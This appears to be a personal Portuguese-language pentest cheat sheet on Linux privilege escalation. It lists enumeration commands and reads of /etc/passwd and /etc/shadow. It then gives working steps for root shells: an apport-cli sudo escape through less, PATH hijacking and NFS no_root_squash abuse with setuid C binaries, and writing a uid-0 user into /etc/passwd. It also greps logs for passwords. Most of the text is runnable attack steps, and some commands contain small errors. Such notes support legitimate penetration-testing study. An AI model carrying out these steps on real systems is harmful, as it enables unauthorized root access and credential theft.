# Principais Arquivos
`/etc/passwd` Lista de usuários do sistema operacional.  
`/etc/shadow` Lista dos hashes das senhas dos usuários.  
`/proc/version` Arquivo com informações sobre o sistema operacional, versão do kernel e compiladores instalados (ex. GCC).  
`/etc/issue` Informações sobre o sistema operacional.  

# Principais Comandos
`hostname` Retorna o hostname da máquina.  
`uname -a` Retorna as informações do sistema, com detalhes sobre o kernel utilizado.  
`ps aux` O comando `ps` exibe os processos que estão rodando no sistema. As flags (a) exibe os processos de todos os usuários, (u) qual usuário iniciou um processo e (x) exibe os processos que não estão atrelados a um terminal.  
`env` Exibe as variáveis de ambiente.  
`sudo -l` Lista os comandos que o usuário tem permissão para executá-los como root.  
`ls -la` Para listar arquivos e diretórios em lista e ocultos.  
`id $user` Exibe informações do usuário como nível de privilégio e grupos associados.  
`history` Exibe o histórico de comandos executados no terminal.  
`ifconfig` Exibe as informações das interfaces de rede da máquina.  
`ip route` Exibe as rotas de rede existentes.  

# Checklist

## Identificação de usuários

### Nomes dos usuários
Através do arquivo /etc/passwd.
```bash
cat /etc/passwd | grep bash
```

No diretório /home  
```bash
ls /home
```

### Arquivos do usuário
```bash
find / -user $username 2>/dev/null
```
## Identificação de permissões do usuários
Em todos os casos, pesquisar pelos binários identificados no site [GTFOBins](https://gtfobins.github.io/).

### Permissão SUDO
```bash
sudo -l
```

#### Binários

##### **apport-cli < 2.26.0**
Essas versões do apport-cli são vulneráveis pois utilizam o comando less e dessa forma é possível escalar privilégio.

Primeiro verifique a versão:
```bash
apport-cli --version
```

Inicie o binário com  flag --file-bug:
```bash
sudo /usr/bin/apport-cli --file-bug
```

Escolha a opção 1:
![[Notes/PrivEsc Linux/img/Pasted image 20240409233329.png]]

No segundo menu escolha a opção 1:
![[Notes/PrivEsc Linux/img/Pasted image 20240409233429.png]]

Pressione qualquer tecla para continuar e no menu do relatório, escolha a opção V (View report):
![[Notes/PrivEsc Linux/img/Pasted image 20240409233604.png]]

Nesse momento o less é executado, então digite `/bin/bash` após os dois pontos e será retornada a shell do root:
![[Notes/PrivEsc Linux/img/Pasted image 20240409233723.png]]



### Permissão SUID
```bash
find / -perm -u=s -type f 2>/dev/null
```

### Permissão Capabilites
```bash
getcap -r / 2>/dev/null
```

## Identificação de tarefas programadas

Através do arquivo /etc/crontab
```bash
cat /etc/crontab
```
Caso um script não possua o caminho absoluto definido no `/etc/crontab`, o cron irá buscar o arquivo nos diretórios definidos no PATH.
Lembre-se de dar a permissão de execução ao script.  

# Exploração OLD

### Buscando senhas no log:  
`grep -Ri password /var/log 2>/dev/null`  

### Manipulando a variável PATH  
Identificando diretórios com permissão de gravação:  
`find / -writable 2>/dev/null`  
`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`  
Adicionando a pasta `/tmp` ao PATH:  
`export PATH=/tmp:$PATH`  
Criando um binário com o script que irá executar um comando:  
```
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("cmd");
}
```
Para compilar o código acima utilize o compilador GCC:  
`gcc binario.c -o binario -w`  
Altere as permissões do binário para SUID:  
`chmod u+s binario`  
Agora criamos o comando que será executado:  
`echo "/bin/bash" > cmd`  
Alteramos a permissão do comando criado:  
`chmod 777 cmd`  
E executamos o binário com o script que irá chamar o comando.  
Lembre-se de que os arquivos devem estar em um local com permissão de escrita, além do diretório estar declarado na variável PATH.  
### Explorando serviços de compartilhamento de arquivos (NFS)  
Na máquina alvo, verifique se existe diretórios compartilhados com a permissão no_root_squash:  
`cat /etc/exports`  
Na máquina atacante, verifique quais diretórios estão permitidos realizar a montagem:  
`showmount -e IP`  
Crie uma pasta na máquina atacante e faça a montagem do diretório remoto no diretório criado:  
`sudo mount -o rw IP:/shared/remote/folder /local/folder`  
Na pasta local, crie um script que irá executar a shell:  
```
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("/bin/bash");
  return 0;
}
```
Compile o script utilizando o GCC:  
`sudo gcc root.c -o root -static`  
Altere as permissões do binário criado para SUID:  
`sudo chmod +s root`  
Execute na máquina remota para escalar privilégio.  

### Adicionando um usuário com privilégio root  

Criar o hash da senha que será utilizada:  
`openssl passwd -1 -salt HACK senha123`  

Adicione as informações do usuário no arquivo `/etc/passwd`:  
`hacker3:\$1\$lord\$jZwvvuLH/snkFA6S/AJA6.:0:0:root:/root:/bin/bash`  

Agora é só trocar para o usuário criado:  
`su hacker`  

`python -c 'import crypt; print(crypt.crypt(senha123, "$6$lord"))'`  
`

`\$1\$lord\$jZwvvuLH\/snkFA6S\/AJA6\.`  

# Enumeração Automatizada  
**LinPeas**: https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh  
**LinEnum:** https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh  
**LES (Linux Exploit Suggester):** https://github.com/The-Z-Labs/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh  
**Linux Smart Enumeration:** https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh  
**Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)  

# Links de referências
## Vulnerabilidades conhecidas em Kernels  
https://www.linuxkernelcves.com/cves  

## Exploração de binários  
https://gtfobins.github.io/ -  Linux  
https://lolbas-project.github.io/ - Windows  

## MSF Venom Builder  
https://pentest.ws/tools/venom-builder  


